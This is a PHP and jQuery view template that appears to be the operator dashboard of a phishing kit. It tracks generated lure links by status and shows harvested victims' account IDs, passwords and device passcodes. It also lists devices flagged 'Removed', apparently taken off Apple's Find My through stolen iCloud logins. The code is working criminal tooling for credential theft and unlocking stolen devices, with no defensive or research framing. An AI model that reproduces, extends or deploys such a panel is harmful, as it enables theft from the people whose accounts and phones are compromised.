<?php
$model = 'GeneratedLink';
$controller = 'generated_links';
$action = 'link';


$table_row_actions = array(
	'block_pending'=>array(
		'label'=>'<i class="fa-solid fa-ban"></i> Block',
		'url'=>array('controller'=>$controller,'action'=>'block_link'),
		'ajax'=>array(
			'description' => "You won't be able to revert this."
		),
		'on'=>array(
			'field'=>array('GeneratedLink.status_desc'=>'<span class="mb-1 badge bg-danger">Awaiting</span>'),
			'operator' => 'equal'
		)
	),
	'block_visited'=>array(
		'label'=>'<i class="fa-solid fa-ban"></i> Block',
		'url'=>array('controller'=>$controller,'action'=>'block_link'),
		'ajax'=>array(
			'description' => "You won't be able to revert this."
		),
		'on'=>array(
			'field'=>array('GeneratedLink.status_desc'=>'<span class="mb-1 badge bg-warning">Visited</span>'),
			'operator' => 'equal'
		)
	),
	'block_passcode'=>array(
		'label'=>'<i class="fa-solid fa-ban"></i> Block',
		'url'=>array('controller'=>$controller,'action'=>'block_link'),
		'ajax'=>array(
			'description' => "You won't be able to revert this."
		),
		'on'=>array(
			'field'=>array('GeneratedLink.status_desc'=>'<span class="mb-1 badge bg-info">Passcode</span>'),
			'operator' => 'equal'
		)
	),
	'view_logs'=>array(
		'label'=>'<i class="fa-solid fa-list-ul"></i> View Logs',
		'url'=>array('controller'=>$controller,'action'=>'view_logs'),
		'on'=>array(
			'field'=>array('GeneratedLink.status_desc'=>'<span class="mb-1 badge bg-danger">Awaiting</span>'),
			'operator' => 'not'
		)
	),
	'view_account'=>array(
		'label'=>'<i class="fa-solid fa-user"></i> View Account',
		'attributes'=>array('class'=>'view_account'),
		'url'=>array('controller'=>$controller,'action'=>'view_account'),
		'on'=>array(
			'field'=>array('GeneratedLink.status_desc'=>'<span class="mb-1 badge bg-success">Success</span>'),
			'operator' => 'equal'
		)
	),
	'view_passcode'=>array(
		'label'=>'<i class="fa-solid fa-key"></i> View Passcode',
		'attributes'=>array('class'=>'view_passcode'),
		'url'=>array('controller'=>$controller,'action'=>'view_account'),
		'on'=>array(
			'field'=>array('GeneratedLink.status_desc'=>'<span class="mb-1 badge bg-info">Passcode</span>'),
			'operator' => 'equal'
		)
	),
	'view_unlocked'=>array(
		'label'=>'<i class="fa-solid fa-lock-keyhole-open"></i> View Devices',
		'attributes'=>array('class'=>'view_unlocked'),
		'url'=>array('controller'=>$controller,'action'=>'view_devices'),
		'on'=>array(
			'field'=>array('GeneratedLink.status_desc'=>'<span class="mb-1 badge bg-success">Success</span>'),
			'operator' => 'equal'
		)
	),
);

if($_SESSION['Auth']['User']['role'] == 'Administrator'){
	$table_row_actions['revive_link'] = array(
		'label'=>'<i class="fa-solid fa-rotate-left"></i> Revive Link',
		'url'=>array('controller'=>$controller,'action'=>'revive_link'),
		'ajax'=>array(
			'description'=> 'This will unblock the link.'
		),
		'on'=>array(
			'field'=>array('GeneratedLink.status_desc'=>'<span class="mb-1 badge bg-muted">Blocked</span>'),
			'operator' => 'equal'
		)
	);
	$table_row_actions = array_merge(array_splice($table_row_actions, -1), $table_row_actions);
}

echo $this->ModernizeComponent->create_card_container_start('Passcode Attempts');
echo $this->ModernizeComponent->create_table_view(array(
	'class' => 'table align-middle text-nowrap',
	'column-headers' => array(
		array('Status' => array()),
		array('Script Name' => array('style'=>'min-width: 150px;')),
		array('Link' => array('style'=>'min-width: 200px;')),
		array('Notes' => array('style'=>'min-width: 130px;')),
		array('Age' => array('style'=>'min-width: 130px;')),
		array('Created By' => array('style'=>'min-width: 130px;')),
	),
	'table-settings' => array(
		'model' => $model,
		'controller' => $controller,
		'prefix' => false,
		'action' => $action,
		'ajax'=>true,
		'multiselect'=>array(
			'delete',
			'enable',
			'disable',
		),
		'include' => array(
			'search',
			'delete' => array(
				'ajax'=>array(
					'description'=>"You won't be able to revert this."
				)
			)
		),
		'include_controls' => $table_row_actions,
		'search_options' => array(
			array('name',12, array('label' => 'Script Name','required')),
			array('folder',12, array('label' => 'Folder Name','type'=>'text')),
			array('web',12, array('type'=>'select'),getSupportedWeb()),
			array('map',12, array('label'=>'Map Script','type'=>'switch_yes')),
			array('status',12, array('type'=>'select'),getStatusArray()),
		),
		'table-data' => $data ?? array(),
	),
	
));
echo $this->ModernizeComponent->create_card_container_end();
?>
<script>
$( document ).ready(function() {
    $(document).on('click','.view_account',function(e){
		e.preventDefault();
		showLoading();
		$.ajax({
		  type: "GET",
		  url: $(this).attr('href'),
		  dataType: "json",
		  success: function(data){
			 if(data.success == true){
				 swal.fire({title: 'Account Information', icon: 'success', html: '<p class="m-0">ID: <b>' + data.username + '</b></p><p >Password: <b>' + data.password + '</b></p><p class="m-0">Passcode: <b>' + data.passcode + '</b></p>'});
			  }else if (data.success == false){
				 swal.fire("Error", data.msg, "error");
			  }else{
				 swal.fire("Error", 'An error occured, please contact system administrator.', "error");
			  }
		  },
		  error: function(XMLHttpRequest, textStatus, errorThrown) {
			 swal.fire("Error", 'An error occured, please contact system administrator.', "error");
		  }
		});
	});
	
	$(document).on('click','.view_passcode',function(e){
		e.preventDefault();
		showLoading();
		$.ajax({
		  type: "GET",
		  url: $(this).attr('href'),
		  dataType: "json",
		  success: function(data){
			 if(data.success == true){
				 swal.fire({title: 'Device Passcode', icon: 'success', html: '<p class="m-0">Passcode: <b>' + data.passcode + '</b></p>'});
			  }else if (data.success == false){
				 swal.fire("Error", data.msg, "error");
			  }else{
				 swal.fire("Error", 'An error occured, please contact system administrator.', "error");
			  }
		  },
		  error: function(XMLHttpRequest, textStatus, errorThrown) {
			 swal.fire("Error", 'An error occured, please contact system administrator.', "error");
		  }
		});
	});
	
	$(document).on('click','.view_unlocked',function(e){
		e.preventDefault();
		showLoading();
		$.ajax({
		  type: "GET",
		  url: $(this).attr('href'),
		  dataType: "json",
		  success: function(data){
			 if(data.success == true){
				 var html = '<div class="row fs-3">';
				 var removed_devices = JSON.parse(data.removed_devices);
				 removed_devices.device_list.forEach((element) => {
					 
					 var device_img = "";
					 var img_width = "100%";
					 if (typeof element.device_img !== 'undefined' && element.device_img.trim().length >=1) {
							device_img = element.device_img;
							img_width = "35%";
					 }else{
						 device_img = "https://statici.icloud.com/fmipmobile/deviceImages-9.0/" + element.device_type + "/" + element.raw_device_model + "/online-infobox__3x.png";
					 }
					 
					 var status = '<span class="m-0 p-1 badge bg-success">OFF</span>'
					 if(element.msg !== 'Removed'){
						status = '<span class="m-0 p-1 badge bg-danger">Failed</span>' 
					 }
					 
					 html+='<div class="col-md-4 m-0 p-0">';
					 html+='<div class=" h-100">';
					 html+='<img src="'+ device_img +'" class="card-img-top" alt="Thumbnail 2">';
					 html+='<div class="card-body">';
					 html+='<h5 class="card-title fs-3 fw-bolder">'+ element.model +'</h5>';
					 html+='<ul class="list-unstyled">';
					 // html+='<li>Owner: '+ element.owner_name +'</li>';
					 html+='<li>Passcode: '+ element.passcode_length +'</li>';
					 html+='<li>Status: ' + status + '</li>';
					 html+='</ul>';
					 html+='</div>';
					 html+='</div>';
					 html+='</div>';
				 });
				 html += '</div>';
				 swal.fire({html: html, showCloseButton: true,confirmButtonText: "Close",});
				 
			  }else if (data.success == false){
				 swal.fire("Error", data.msg, "error");
			  }else{
				 swal.fire("Error", 'An error occured, please contact system administrator.', "error");
			  }
		  },
		  error: function(XMLHttpRequest, textStatus, errorThrown) {
			 swal.fire("Error", 'An error occured, please contact system administrator.', "error");
		  }
		});
	});
	
});
</script>